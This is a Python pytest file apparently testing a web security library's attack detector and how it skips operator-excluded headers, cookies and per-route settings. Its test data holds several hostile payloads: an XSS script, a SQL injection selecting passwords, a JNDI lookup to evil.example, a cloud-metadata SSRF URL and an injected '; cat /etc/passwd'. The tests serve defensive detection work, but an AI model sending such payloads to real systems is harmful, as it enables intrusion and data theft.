import pytest

from guard_core.models import SyncSecurityConfig
from guard_core.sync.decorators.base import RouteConfig
from guard_core.sync.utils import detect_penetration_attempt
from tests.test_sync.conftest import SyncMockGuardRequest

PAYLOADS = [
    "<script>alert(1)</script>",
    "' UNION SELECT password FROM users--",
    "${jndi:ldap://evil.example/a}",
    "http://169.254.169.254/latest/meta-data/",
    "; cat /etc/passwd",
]


def _flagged(
    headers: dict[str, str],
    config: SyncSecurityConfig | None = None,
    route_config: RouteConfig | None = None,
) -> bool:
    request = SyncMockGuardRequest(path="/s", headers=headers)
    result = detect_penetration_attempt(
        request, config or SyncSecurityConfig(), route_config
    )
    return result.is_threat


@pytest.mark.parametrize("payload", PAYLOADS)
def test_a_header_the_operator_lists_is_not_scanned_in_any_category(
    payload: str,
) -> None:
    config = SyncSecurityConfig(excluded_detection_headers={"X-Report-Note"})

    assert _flagged({"x-report-note": payload}) is True
    assert _flagged({"x-report-note": payload}, config) is False
    assert _flagged({"X-REPORT-NOTE": f"  {payload}"}, config) is False


def test_the_exclusion_covers_only_the_listed_header() -> None:
    config = SyncSecurityConfig(excluded_detection_headers={"x-report-note"})

    assert _flagged({"x-other": "<script>alert(1)</script>"}, config) is True


def test_a_route_listed_header_is_not_scanned_in_any_category() -> None:
    route_config = RouteConfig()
    route_config.excluded_detection_headers = {"x-report-note"}

    flagged_without = _flagged({"x-report-note": "<script>alert(1)</script>"})
    flagged_with = _flagged(
        {"x-report-note": "<script>alert(1)</script>"}, None, route_config
    )

    assert flagged_without is True
    assert flagged_with is False


def test_a_built_in_default_header_the_operator_also_lists_is_fully_skipped() -> None:
    config = SyncSecurityConfig(excluded_detection_headers={"user-agent"})
    headers = {"user-agent": "${jndi:ldap://evil.example/a}"}

    assert _flagged(headers) is True
    assert _flagged(headers, config) is False


def test_a_built_in_default_header_skips_ssrf_only() -> None:
    assert (
        _flagged({"referer": "http://169.254.169.254/", "host": "localhost:8000"})
        is False
    )
    assert _flagged({"referer": "http://169.254.169.254/"}) is True
    assert _flagged({"referer": "${jndi:ldap://evil.example/a}"}) is True


def test_a_listed_cookie_header_skips_every_cookie_pair() -> None:
    config = SyncSecurityConfig(excluded_detection_headers={"cookie"})
    headers = {"cookie": "a=1; q=<script>alert(1)</script>"}

    assert _flagged(headers) is True
    assert _flagged(headers, config) is False
